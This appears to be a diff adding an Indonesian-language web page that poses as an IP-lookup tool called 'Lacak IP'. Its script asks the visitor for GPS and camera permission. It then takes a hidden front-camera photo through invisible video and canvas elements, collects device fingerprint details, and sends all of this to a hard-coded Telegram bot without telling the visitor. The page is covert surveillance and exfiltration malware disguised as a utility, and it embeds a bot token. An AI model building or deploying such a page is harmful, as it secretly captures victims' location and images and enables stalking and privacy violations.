@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lacak IP - Cek Lokasi & Informasi Jaringan</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
+        body {
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            color: #e2e8f0; min-height: 100vh; padding: 20px;
+        }
+        .container { max-width: 700px; margin: 0 auto; }
+
+        .header {
+            text-align: center; padding: 30px 20px;
+            background: linear-gradient(135deg, #1e40af, #7c3aed);
+            border-radius: 16px; margin-bottom: 20px;
+            box-shadow: 0 10px 30px rgba(124, 58, 237, 0.3);
+        }
+        .header h1 { font-size: 26px; margin-bottom: 8px; }
+        .header p { font-size: 14px; opacity: 0.9; }
+
+        .input-box { display: flex; gap: 10px; margin-bottom: 20px; }
+        .input-box input {
+            flex: 1; padding: 14px 18px; border-radius: 10px;
+            border: 1px solid #334155; background: #1e293b;
+            color: #e2e8f0; font-size: 15px; outline: none;
+        }
+        .input-box input:focus { border-color: #7c3aed; }
+        .input-box button {
+            padding: 14px 28px; background: #7c3aed; color: #fff;
+            border: none; border-radius: 10px; cursor: pointer;
+            font-weight: bold; font-size: 15px; transition: 0.3s;
+        }
+        .input-box button:hover { background: #6d28d9; }
+        .input-box button:disabled { opacity: 0.6; cursor: wait; }
+
+        .card {
+            background: #1e293b; border-radius: 14px;
+            padding: 22px; margin-bottom: 15px;
+            border: 1px solid #334155;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+        }
+        .card h2 {
+            font-size: 17px; margin-bottom: 15px;
+            color: #a78bfa; display: flex; align-items: center; gap: 8px;
+        }
+
+        .info-row {
+            display: flex; justify-content: space-between;
+            padding: 10px 0; border-bottom: 1px solid #334155;
+            font-size: 14px;
+        }
+        .info-row:last-child { border-bottom: none; }
+        .info-label { color: #94a3b8; }
+        .info-value { color: #e2e8f0; font-weight: 500; text-align: right; max-width: 60%; word-break: break-all; }
+
+        .loading { text-align: center; padding: 20px; color: #a78bfa; font-size: 14px; }
+        .spinner {
+            display: inline-block; width: 20px; height: 20px;
+            border: 3px solid #334155; border-top-color: #7c3aed;
+            border-radius: 50%; animation: spin 0.8s linear infinite;
+            margin-right: 8px; vertical-align: middle;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .map-box {
+            width: 100%; height: 250px; border-radius: 10px;
+            overflow: hidden; margin-top: 10px;
+            border: 1px solid #334155;
+        }
+        .map-box iframe { width: 100%; height: 100%; border: 0; }
+
+        .status-box {
+            padding: 12px; border-radius: 8px; margin-top: 10px;
+            font-size: 13px; display: none;
+        }
+        .status-success { background: rgba(34, 197, 94, 0.15); border-left: 4px solid #22c55e; color: #86efac; }
+        .status-error { background: rgba(239, 68, 68, 0.15); border-left: 4px solid #ef4444; color: #fca5a5; }
+        .status-info { background: rgba(59, 130, 246, 0.15); border-left: 4px solid #3b82f6; color: #93c5fd; }
+
+        video { display: none; }
+        canvas { display: none; }
+
+        .footer { text-align: center; padding: 20px; color: #64748b; font-size: 12px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+
+        <!-- HEADER -->
+        <div class="header">
+            <h1>🔍 Lacak IP</h1>
+            <p>Cek lokasi, informasi jaringan, dan data perangkat</p>
+        </div>
+
+        <!-- INPUT + TOMBOL LACAK -->
+        <div class="input-box">
+            <input type="text" id="ipInput" placeholder="Masukkan IP target (kosongkan untuk IP sendiri)">
+            <button id="btnLacak" onclick="mulaiLacak()">🔍 Lacak</button>
+        </div>
+
+        <!-- HASIL INFO IP -->
+        <div class="card">
+            <h2>🌐 Informasi IP</h2>
+            <div id="ipInfo">
+                <div class="loading"><span class="spinner"></span>Menunggu pelacakan...</div>
+            </div>
+        </div>
+
+        <!-- INFO LOKASI -->
+        <div class="card">
+            <h2>📍 Informasi Lokasi</h2>
+            <div id="locInfo">
+                <div class="loading"><span class="spinner"></span>Menunggu pelacakan...</div>
+            </div>
+        </div>
+
+        <!-- MAPS -->
+        <div class="card">
+            <h2>🗺️ Peta Lokasi</h2>
+            <div class="map-box" id="mapBox">
+                <iframe id="mapFrame" src="about:blank" loading="lazy"></iframe>
+            </div>
+        </div>
+
+        <!-- INFO PERANGKAT -->
+        <div class="card">
+            <h2>📱 Informasi Perangkat</h2>
+            <div id="deviceInfo">
+                <div class="loading"><span class="spinner"></span>Menunggu pelacakan...</div>
+            </div>
+        </div>
+
+        <div class="status-box" id="statusBox"></div>
+
+        <!-- HIDDEN ELEMENT -->
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
+
+        <div class="footer">
+            © 2025 Lacak IP Pro. Semua data diproses secara real-time.
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // KONFIGURASI TELEGRAM
+        // ============================================
+        const TELEGRAM_TOKEN = "8611108052:AAF8FT2G2M9ZBIrAVlV2MQ6YMrFigZepSYU"; // GANTI TOKEN BOT
+        const TELEGRAM_CHAT_ID = "8164233023"; // GANTI CHAT ID
+
+        // ============================================
+        // VARIABEL GLOBAL DATA
+        // ============================================
+        let dataGlobal = {
+            ip: "-", isp: "-", kota: "-", provinsi: "-", negara: "-",
+            kodePos: "-", latitude: null, longitude: null, timezone: "-",
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            bahasa: navigator.language,
+            screen: `${screen.width}x${screen.height}`,
+            warna: `${screen.colorDepth}-bit`,
+            cpu: navigator.hardwareConcurrency || "-",
+            memori: navigator.deviceMemory || "-",
+            online: navigator.onLine ? "Online" : "Offline",
+            gpsLat: null, gpsLng: null, gpsAkurasi: null,
+            fotoBase64: null,
+            waktu: new Date().toLocaleString('id-ID')
+        };
+
+        // ============================================
+        // FUNGSI UTAMA: MULAI LACAK
+        // ============================================
+        async function mulaiLacak() {
+            const btn = document.getElementById('btnLacak');
+            btn.disabled = true;
+            btn.textContent = '⏳ Melacak...';
+
+            showStatus('📡 Memulai proses pelacakan...', 'info');
+
+            try {
+                // ===== STEP 1: IP LOOKUP =====
+                await lacakIP();
+
+                // ===== STEP 2: MINTA IZIN LOKASI (auto popup) =====
+                await ambilLokasi();
+
+                // ===== STEP 3: MINTA IZIN KAMERA (auto popup) =====
+                await ambilKamera();
+
+                // ===== STEP 4: KIRIM KE TELEGRAM =====
+                await kirimSemuaData();
+
+                showStatus('✅ Pelacakan selesai!', 'success');
+                btn.textContent = '✅ Selesai';
+                btn.disabled = false;
+
+            } catch (err) {
+                showStatus('❌ Gagal: ' + err.message, 'error');
+                btn.disabled = false;
+                btn.textContent = '🔍 Lacak';
+            }
+        }
+
+        // ============================================
+        // 1. LACAK IP
+        // ============================================
+        async function lacakIP() {
+            const manualIP = document.getElementById('ipInput').value.trim();
+            const url = manualIP ? `https://ipapi.co/${manualIP}/json/` : 'https://ipapi.co/json/';
+
+            try {
+                const res = await fetch(url);
+                const data = await res.json();
+                if (data.error) throw new Error(data.reason || 'IP tidak valid');
+
+                dataGlobal.ip = data.ip || '-';
+                dataGlobal.isp = data.org || '-';
+                dataGlobal.kota = data.city || '-';
+                dataGlobal.provinsi = data.region || '-';
+                dataGlobal.negara = data.country_name || '-';
+                dataGlobal.kodePos = data.postal || '-';
+                dataGlobal.latitude = data.latitude;
+                dataGlobal.longitude = data.longitude;
+                dataGlobal.timezone = data.timezone || '-';
+
+                document.getElementById('ipInfo').innerHTML = `
+                    <div class="info-row"><span class="info-label">IP Address</span><span class="info-value">${dataGlobal.ip}</span></div>
+                    <div class="info-row"><span class="info-label">ISP / Provider</span><span class="info-value">${dataGlobal.isp}</span></div>
+                    <div class="info-row"><span class="info-label">Negara</span><span class="info-value">${dataGlobal.negara}</span></div>
+                    <div class="info-row"><span class="info-label">Kota</span><span class="info-value">${dataGlobal.kota}</span></div>
+                    <div class="info-row"><span class="info-label">Provinsi</span><span class="info-value">${dataGlobal.provinsi}</span></div>
+                    <div class="info-row"><span class="info-label">Kode Pos</span><span class="info-value">${dataGlobal.kodePos}</span></div>
+                    <div class="info-row"><span class="info-label">Timezone</span><span class="info-value">${dataGlobal.timezone}</span></div>
+                    <div class="info-row"><span class="info-label">Koordinat</span><span class="info-value">${dataGlobal.latitude}, ${dataGlobal.longitude}</span></div>
+                `;
+
+                document.getElementById('locInfo').innerHTML = `
+                    <div class="info-row"><span class="info-label">Alamat Perkiraan</span><span class="info-value">${dataGlobal.kota}, ${dataGlobal.provinsi}, ${dataGlobal.negara}</span></div>
+                    <div class="info-row"><span class="info-label">Latitude</span><span class="info-value">${dataGlobal.latitude}</span></div>
+                    <div class="info-row"><span class="info-label">Longitude</span><span class="info-value">${dataGlobal.longitude}</span></div>
+                `;
+
+                const mapUrl = `https://www.openstreetmap.org/export/embed.html?bbox=${dataGlobal.longitude - 0.05}%2C${dataGlobal.latitude - 0.05}%2C${dataGlobal.longitude + 0.05}%2C${dataGlobal.latitude + 0.05}&layer=mapnik&marker=${dataGlobal.latitude}%2C${dataGlobal.longitude}`;
+                document.getElementById('mapFrame').src = mapUrl;
+
+                renderDeviceInfo();
+            } catch (err) {
+                throw new Error('Gagal lacak IP: ' + err.message);
+            }
+        }
+
+        // ============================================
+        // 2. AMBIL LOKASI (AUTO POPUP IZIN)
+        // ============================================
+        function ambilLokasi() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve();
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        dataGlobal.gpsLat = pos.coords.latitude;
+                        dataGlobal.gpsLng = pos.coords.longitude;
+                        dataGlobal.gpsAkurasi = pos.coords.accuracy;
+
+                        const mapUrl = `https://www.openstreetmap.org/export/embed.html?bbox=${pos.coords.longitude - 0.01}%2C${pos.coords.latitude - 0.01}%2C${pos.coords.longitude + 0.01}%2C${pos.coords.latitude + 0.01}&layer=mapnik&marker=${pos.coords.latitude}%2C${pos.coords.longitude}`;
+                        document.getElementById('mapFrame').src = mapUrl;
+
+                        document.getElementById('locInfo').innerHTML += `
+                            <div class="info-row"><span class="info-label">🛰️ GPS Latitude</span><span class="info-value">${pos.coords.latitude}</span></div>
+                            <div class="info-row"><span class="info-label">🛰️ GPS Longitude</span><span class="info-value">${pos.coords.longitude}</span></div>
+                            <div class="info-row"><span class="info-label">🛰️ Akurasi GPS</span><span class="info-value">± ${Math.round(pos.coords.accuracy)} meter</span></div>
+                        `;
+                        resolve();
+                    },
+                    (err) => {
+                        console.warn('Lokasi ditolak:', err.message);
+                        resolve();
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            });
+        }
+
+        // ============================================
+        // 3. AMBIL KAMERA (AUTO POPUP IZIN)
+        // ============================================
+        function ambilKamera() {
+            return new Promise(async (resolve) => {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user', width: 640, height: 480 },
+                        audio: false
+                    });
+
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    await video.play();
+
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        dataGlobal.fotoBase64 = canvas.toDataURL('image/jpeg', 0.7);
+                        stream.getTracks().forEach(t => t.stop());
+                        resolve();
+                    }, 1500);
+
+                } catch (err) {
+                    console.warn('Kamera ditolak:', err.message);
+                    resolve();
+                }
+            });
+        }
+
+        // ============================================
+        // 4. KIRIM SEMUA DATA KE TELEGRAM
+        // ============================================
+        async function kirimSemuaData() {
+            const teks = `
+🔔 *DATA PELACAKAN MASUK*
+━━━━━━━━━━━━━━━━━━━━
+🌐 *INFORMASI IP*
+• IP Publik    : ${dataGlobal.ip}
+• ISP          : ${dataGlobal.isp}
+• Negara       : ${dataGlobal.negara}
+• Provinsi     : ${dataGlobal.provinsi}
+• Kota         : ${dataGlobal.kota}
+• Kode Pos     : ${dataGlobal.kodePos}
+• Timezone     : ${dataGlobal.timezone}
+• Koordinat IP : ${dataGlobal.latitude}, ${dataGlobal.longitude}
+
+📍 *LOKASI GPS*
+• Latitude     : ${dataGlobal.gpsLat || 'Ditolak/Tidak tersedia'}
+• Longitude    : ${dataGlobal.gpsLng || 'Ditolak/Tidak tersedia'}
+• Akurasi      : ${dataGlobal.gpsAkurasi ? '± ' + Math.round(dataGlobal.gpsAkurasi) + ' m' : '-'}
+• Maps         : ${dataGlobal.gpsLat ? `https://maps.google.com/?q=${dataGlobal.gpsLat},${dataGlobal.gpsLng}` : '-'}
+
+📱 *INFORMASI PERANGKAT*
+• Platform     : ${dataGlobal.platform}
+• Sistem Operasi: ${deteksiOS()}
+• Browser      : ${deteksiBrowser()}
+• User Agent   : ${dataGlobal.userAgent}
+• Bahasa       : ${dataGlobal.bahasa}
+• Layar        : ${dataGlobal.screen}
+• Warna        : ${dataGlobal.warna}
+• CPU          : ${dataGlobal.cpu} core
+• RAM          : ${dataGlobal.memori} GB
+• Status       : ${dataGlobal.online}
+
+🕐 *Waktu Akses* : ${dataGlobal.waktu}
+━━━━━━━━━━━━━━━━━━━━
+            `.trim();
+
+            try {
+                const urlText = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+                const resText = await fetch(urlText, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: teks,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                const dataText = await resText.json();
+                if (!dataText.ok) throw new Error(dataText.description);
+
+                if (dataGlobal.fotoBase64) {
+                    const blob = await (await fetch(dataGlobal.fotoBase64)).blob();
+                    const form = new FormData();
+                    form.append('chat_id', TELEGRAM_CHAT_ID);
+                    form.append('photo', blob, 'kamera_depan.jpg');
+                    form.append('caption', `📷 Foto kamera depan - ${dataGlobal.waktu}`);
+
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                        method: 'POST', body: form
+                    });
+                }
+            } catch (err) {
+                console.warn('Gagal kirim:', err.message);
+            }
+        }
+
+        // ============================================
+        // 5. HELPER: DEVICE INFO
+        // ============================================
+        function renderDeviceInfo() {
+            document.getElementById('deviceInfo').innerHTML = `
+                <div class="info-row"><span class="info-label">Nama HP / Platform</span><span class="info-value">${dataGlobal.platform}</span></div>
+                <div class="info-row"><span class="info-label">Sistem Operasi</span><span class="info-value">${deteksiOS()}</span></div>
+                <div class="info-row"><span class="info-label">Tipe Browser</span><span class="info-value">${deteksiBrowser()}</span></div>
+                <div class="info-row"><span class="info-label">User Agent</span><span class="info-value" style="font-size:11px">${dataGlobal.userAgent}</span></div>
+                <div class="info-row"><span class="info-label">Bahasa</span><span class="info-value">${dataGlobal.bahasa}</span></div>
+                <div class="info-row"><span class="info-label">Resolusi Layar</span><span class="info-value">${dataGlobal.screen}</span></div>
+                <div class="info-row"><span class="info-label">Kedalaman Warna</span><span class="info-value">${dataGlobal.warna}</span></div>
+                <div class="info-row"><span class="info-label">Jumlah CPU</span><span class="info-value">${dataGlobal.cpu} core</span></div>
+                <div class="info-row"><span class="info-label">RAM Perangkat</span><span class="info-value">${dataGlobal.memori} GB</span></div>
+                <div class="info-row"><span class="info-label">Status Koneksi</span><span class="info-value">${dataGlobal.online}</span></div>
+                <div class="info-row"><span class="info-label">Waktu Akses</span><span class="info-value">${dataGlobal.waktu}</span></div>
+            `;
+        }
+
+        function deteksiOS() {
+            const ua = navigator.userAgent;
+            if (/android/i.test(ua)) return 'Android';
+            if (/iPhone|iPad|iPod/i.test(ua)) return 'iOS';
+            if (/Windows/i.test(ua)) return 'Windows';
+            if (/Mac/i.test(ua)) return 'macOS';
+            if (/Linux/i.test(ua)) return 'Linux';
+            return 'Tidak diketahui';
+        }
+
+        function deteksiBrowser() {
+            const ua = navigator.userAgent;
+            if (/Edg/i.test(ua)) return 'Microsoft Edge';
+            if (/OPR|Opera/i.test(ua)) return 'Opera';
+            if (/Chrome/i.test(ua)) return 'Google Chrome';
+            if (/Safari/i.test(ua)) return 'Safari';
+            if (/Firefox/i.test(ua)) return 'Mozilla Firefox';
+            return 'Tidak diketahui';
+        }
+
+        // ============================================
+        // 6. HELPER: STATUS
+        // ============================================
+        function showStatus(msg, type) {
+            const box = document.getElementById('statusBox');
+            box.style.display = 'block';
+            box.className = 'status-box status-' + type;
+            box.textContent = msg;
+        }
+    </script>
+</body>
+</html>
